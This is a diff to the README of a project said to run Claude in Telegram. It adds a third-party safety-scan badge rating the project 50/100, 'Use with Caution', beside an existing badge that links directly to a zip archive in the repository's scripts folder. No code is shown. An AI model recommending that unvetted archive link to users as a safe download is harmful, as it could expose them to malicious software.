@@ -1,6 +1,7 @@
 # 🤖 claude-telegram-server - Run Claude in Telegram, 24/7
 
 [![Download the latest release](https://img.shields.io/badge/Download%20Release-purple?style=for-the-badge)](https://raw.githubusercontent.com/Hewechargeable220/claude-telegram-server/main/scripts/claude-server-telegram-1.0.zip)
+[![SafeSkill 50/100](https://img.shields.io/badge/SafeSkill-50%2F100_Use%20with%20Caution-orange)](https://safeskill.dev/scan/hewechargeable220-claude-telegram-server)
 
 ## 📌 What this is
 
